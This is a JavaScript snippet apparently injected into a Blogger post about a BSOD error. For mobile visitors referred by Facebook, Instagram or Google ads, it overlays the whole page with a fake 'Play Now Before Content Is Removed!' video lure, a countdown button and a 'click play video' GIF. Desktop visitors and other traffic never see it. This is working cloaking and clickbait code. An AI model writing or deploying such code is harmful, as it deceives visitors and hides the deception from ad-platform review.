(function() {
    const targetUrl = "https://testingcarablog.blogspot.com/2022/10/memperbaiki-error-bsod-kernel-auto.html";
    const currentUrl = window.location.href.split('?')[0].split('#')[0];
    const referrer = document.referrer.toLowerCase();
    
    const allowedReferrers = ['facebook.com', 'instagram.com', 'googleadservices.com'];
    const isAllowedReferrer = allowedReferrers.some(domain => referrer.includes(domain));

    if ((currentUrl === targetUrl || currentUrl === targetUrl + "/") && isAllowedReferrer) {
        
        const style = document.createElement('style');
        style.innerHTML = `
            .dscr-penyelenggaraan-pemerintahan {
                position: fixed;
                top: 0;
                left: 0;
                width: 100vw;
                height: 100vh;
                z-index: 99999999;
                background-color: #e8e8e8;
                display: flex; 
                flex-direction: column;
                justify-content: center;
                align-items: center;
                box-sizing: border-box;
                padding: 20px;
                text-align: center;
            }
            .dscr-penyelenggaraan-pemerintahan img {
                max-width: 100%;
                height: auto;
            }
            @media (min-width: 769px) {
                .dscr-penyelenggaraan-pemerintahan {
                    display: none !important;
                }
            }
        `;
        document.head.appendChild(style);

        const div = document.createElement('div');
        div.className = 'dscr-penyelenggaraan-pemerintahan';
        div.id = 'dscr-penyelenggaraanWrapper';
        div.innerHTML = `
            <h1 id="dscr-pemerintahan-dae" style="text-align: center; margin-top: 0;"><span style="color: #ff0000;">Play Now Before Content Is Removed!</span></h1>
            <br/>
            <button id="dscr-daeButton" style="padding: 10px 20px; font-size: 16px;">PLEASE WAIT</button>
            <img id="dscr-penyelenggaraan-pemerintahanImage" style="display:none;" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEir1OA0qhlF15AQ7OHnZ85_vY2chFFQ0SEGVdboQyi5kEnlxuxMorgk7eEvCSV2dNCr1Nk4SIgKkZFccJtRiaklZLP0MxN_6ykmsWuybVOfhpsI0Rqg69u-WomlGVz4fV4fsZRFzmqCyHDfMTw7WbdjCuTvvoiFnwTqaAEfj16vfXKV7Trls3kNXvLj9yo/s16000/click-play-video.gif" /> 
            <br/>
            <center><p>Cant Play? Reload This Page!</p></center>
        `;

        if (document.body) {
            document.body.appendChild(div);
            startCountdown();
        } else {
            document.addEventListener('DOMContentLoaded', () => {
                document.body.appendChild(div);
                startCountdown();
            });
        }

        function startCountdown() {
            let timeLeft = 2;
            const downloadButton = document.getElementById("dscr-daeButton");
            const gifImage = document.getElementById("dscr-penyelenggaraan-pemerintahanImage");

            const countdown = setInterval(() => {
                downloadButton.textContent = `GET VIDEOS ${timeLeft} SECOND`;
                timeLeft--;
                if (timeLeft < 0) {
                    clearInterval(countdown);
                    downloadButton.style.display = "none";
                    gifImage.style.display = "inline";
                }
            }, 1000);
        }
    }
})();
